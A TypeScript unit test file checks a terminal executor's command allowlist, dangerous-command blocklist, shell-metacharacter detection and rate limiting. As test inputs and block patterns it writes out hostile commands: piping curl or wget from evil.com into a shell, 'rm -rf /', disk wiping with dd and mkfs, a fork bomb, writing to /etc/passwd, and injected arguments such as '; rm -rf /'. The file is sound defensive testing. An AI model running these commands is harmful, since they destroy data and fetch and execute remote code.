/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Kovix. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import * as assert from 'assert';

/**
 * Tests for the TerminalExecutor security logic.
 * Source: src/vs/platform/construct/common/terminal/terminalExecutor.ts
 *
 * These tests verify the pure security functions that can be tested without
 * DI container dependencies.
 */

// ---- Replicate production constants and functions ----

const SHELL_METACHAR_BLOCKLIST = [
        ';', '&&', '||', '|', '`', '$(', ')', '{', '}', '>>', '>', '<', '2>',
];

const SHELL_METACHAR_REGEX = /(;|&&|\|\||\||\$\(|\{|}|\d*>|<)/;

const DEFAULT_COMMAND_ALLOWLIST: string[] = [
        'ls', 'dir', 'cat', 'head', 'tail', 'grep', 'rg', 'find', 'wc',
        'npm', 'yarn', 'pnpm', 'npx', 'node', 'python', 'python3', 'pip', 'pip3',
        'git', 'cargo', 'rustc', 'go', 'dotnet', 'java', 'javac', 'mvn', 'gradle',
        'make', 'cmake', 'gcc', 'g++', 'clang', 'cargo',
        'echo', 'pwd', 'whoami', 'which', 'where', 'env', 'printenv',
        'curl', 'wget',
        'docker', 'podman', 'kubectl',
        'tsc', 'eslint', 'prettier', 'jest', 'vitest', 'mocha',
        'mkdir', 'touch', 'cp', 'mv',
        'sed', 'awk', 'sort', 'uniq', 'diff', 'patch',
];

const BLOCKLIST_PATTERNS: RegExp[] = [
        /rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|--)recursive.*\s+\//,
        /rm\s+-[a-zA-Z]*f[a-zA-Z]*\s+\//,
        /\bsudo\b/,
        /curl\s+.*\|\s*(sh|bash)/,
        /wget\s+.*\|\s*(sh|bash)/,
        /\bmkfs\b/,
        /\bdd\s+.*of=\/dev\//,
        /chmod\s+777\s+\//,
        />\s*\/etc\//,
        /:\(\)\s*\{\s*:\|:&\s*\}/,
        /\bshutdown\b/,
        /\breboot\b/,
        /\binit\s+[06]\b/,
];

function detectShellMetacharInArgs(args: string): string | null {
        const match = args.match(SHELL_METACHAR_REGEX);
        return match ? match[0] : null;
}

function isCommandInAllowlist(command: string, allowlist?: string[]): boolean {
        const list = allowlist ?? DEFAULT_COMMAND_ALLOWLIST;
        const baseCommand = command.trim().split(/\s+/)[0];
        const commandName = baseCommand.split('/').pop() ?? baseCommand;
        return list.some(allowed => commandName === allowed);
}

function isBlocked(command: string): boolean {
        const normalizedCmd = command.trim().toLowerCase();
        for (const pattern of BLOCKLIST_PATTERNS) {
                if (pattern.test(normalizedCmd)) {
                        return true;
                }
        }
        return false;
}

// ---- Tests ----

suite('TerminalExecutor', () => {

        suite('isCommandInAllowlist — exact command matching', () => {
                test('allows exact command name match', () => {
                        assert.strictEqual(isCommandInAllowlist('git'), true);
                        assert.strictEqual(isCommandInAllowlist('npm'), true);
                        assert.strictEqual(isCommandInAllowlist('node'), true);
                });

                test('allows command with arguments (first token match)', () => {
                        assert.strictEqual(isCommandInAllowlist('git status'), true);
                        assert.strictEqual(isCommandInAllowlist('npm install'), true);
                        assert.strictEqual(isCommandInAllowlist('node server.js'), true);
                });

                test('rejects command not in allowlist (exact name)', () => {
                        assert.strictEqual(isCommandInAllowlist('rm'), false);
                        assert.strictEqual(isCommandInAllowlist('sudo'), false);
                        assert.strictEqual(isCommandInAllowlist('bash'), false);
                });

                test('does NOT match by prefix — "gitx" is not "git"', () => {
                        assert.strictEqual(isCommandInAllowlist('gitx'), false);
                });

                test('handles path-prefixed commands', () => {
                        assert.strictEqual(isCommandInAllowlist('/usr/bin/git'), true);
                        assert.strictEqual(isCommandInAllowlist('/usr/local/bin/node'), true);
                });
        });

        suite('isBlocked — dangerous commands are rejected', () => {
                test('blocks rm -rf /', () => {
                        assert.strictEqual(isBlocked('rm -rf /'), true);
                });

                test('blocks rm -rf /home', () => {
                        assert.strictEqual(isBlocked('rm -rf /home'), true);
                });

                test('blocks sudo any command', () => {
                        assert.strictEqual(isBlocked('sudo apt install something'), true);
                        assert.strictEqual(isBlocked('sudo rm -rf /'), true);
                });

                test('blocks curl | sh', () => {
                        assert.strictEqual(isBlocked('curl https://evil.com | sh'), true);
                });

                test('blocks wget | bash', () => {
                        assert.strictEqual(isBlocked('wget https://evil.com | bash'), true);
                });

                test('blocks mkfs', () => {
                        assert.strictEqual(isBlocked('mkfs /dev/sda1'), true);
                });

                test('blocks dd of=/dev/', () => {
                        assert.strictEqual(isBlocked('dd if=/dev/zero of=/dev/sda'), true);
                });

                test('blocks chmod 777 /', () => {
                        assert.strictEqual(isBlocked('chmod 777 /'), true);
                });

                test('blocks writing to /etc/', () => {
                        assert.strictEqual(isBlocked('echo "evil" > /etc/passwd'), true);
                });

                test('blocks fork bomb', () => {
                        assert.strictEqual(isBlocked(':(){ :|:& };:'), true);
                });

                test('blocks shutdown', () => {
                        assert.strictEqual(isBlocked('shutdown -h now'), true);
                });

                test('blocks reboot', () => {
                        assert.strictEqual(isBlocked('reboot'), true);
                });

                test('blocks init 0/6', () => {
                        assert.strictEqual(isBlocked('init 0'), true);
                        assert.strictEqual(isBlocked('init 6'), true);
                });

                test('allows safe commands', () => {
                        assert.strictEqual(isBlocked('ls -la'), false);
                        assert.strictEqual(isBlocked('git status'), false);
                        assert.strictEqual(isBlocked('npm install'), false);
                        assert.strictEqual(isBlocked('echo hello'), false);
                });
        });

        suite('detectShellMetacharInArgs — argument metacharacter detection', () => {
                test('detects semicolon in arguments', () => {
                        assert.strictEqual(detectShellMetacharInArgs('; rm -rf /'), ';');
                });

                test('detects && in arguments', () => {
                        assert.strictEqual(detectShellMetacharInArgs('&& rm -rf /'), '&&');
                });

                test('detects || in arguments', () => {
                        assert.strictEqual(detectShellMetacharInArgs('|| echo pwned'), '||');
                });

                test('detects pipe in arguments', () => {
                        // The regex catches |` but let's test various pipe patterns
                        const result = detectShellMetacharInArgs('| sh');
                        assert.ok(result !== null, 'Should detect pipe metacharacter');
                });

                test('detects command substitution $( in arguments', () => {
                        assert.strictEqual(detectShellMetacharInArgs('$(whoami)'), '$(');
                });

                test('detects redirect > in arguments', () => {
                        const result = detectShellMetacharInArgs('> /etc/passwd');
                        assert.ok(result !== null, 'Should detect redirect metacharacter');
                });

                test('allows clean arguments', () => {
                        assert.strictEqual(detectShellMetacharInArgs('src/main.ts'), null);
                        assert.strictEqual(detectShellMetacharInArgs('--help'), null);
                        assert.strictEqual(detectShellMetacharInArgs('package.json'), null);
                });
        });

        suite('Rate limiting', () => {
                test('rate limiter allows commands within limit', () => {
                        const timestamps: number[] = [];
                        const maxCommands = 10;
                        const windowMs = 30000;

                        // Simulate 5 commands within the window
                        const now = Date.now();
                        for (let i = 0; i < 5; i++) {
                                timestamps.push(now - (5 - i) * 1000);
                        }

                        const windowStart = now - windowMs;
                        const activeTimestamps = timestamps.filter(ts => ts > windowStart);
                        assert.strictEqual(activeTimestamps.length < maxCommands, true);
                });

                test('rate limiter blocks commands exceeding limit', () => {
                        const maxCommands = 10;
                        const windowMs = 30000;
                        const now = Date.now();

                        // Simulate 10 commands within the window
                        const timestamps: number[] = [];
                        for (let i = 0; i < 10; i++) {
                                timestamps.push(now - (10 - i) * 1000);
                        }

                        const windowStart = now - windowMs;
                        const activeTimestamps = timestamps.filter(ts => ts > windowStart);
                        assert.strictEqual(activeTimestamps.length >= maxCommands, true);
                });
        });
});
